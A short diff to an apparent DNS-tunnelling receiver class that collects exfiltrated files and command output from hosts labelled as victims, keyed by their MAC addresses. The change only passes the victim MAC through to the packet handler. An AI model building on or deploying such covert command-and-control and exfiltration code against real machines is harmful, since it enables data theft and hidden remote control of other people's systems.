@@ -84,7 +84,7 @@ class DataReceiver():
         filename = fields[-2] + '.' + fields[-1]
         key = str(victim_mac) + '@' + filename
 
-        self._handle_data_pkts(pkt, dnsqr_layer, filename, key)
+        self._handle_data_pkts(pkt, dnsqr_layer, filename, key, victim_mac)
 
 
     def _receive_recpt(self, pkt):
@@ -128,7 +128,7 @@ class DataReceiver():
             f.write(dnsrr_layer.rrname[:-1] + '\n') # Command associated with output
             f.write(dnsrr_layer.rdata)
 
-    def _handle_data_pkts(self, pkt, dnsqr_layer, filename, key):
+    def _handle_data_pkts(self, pkt, dnsqr_layer, filename, key, victim_mac):
         # Determine if it is a head, body, or tail packet
         if dnsqr_layer.qclass == DataRequestType.HEAD:
             # Create entry, append data
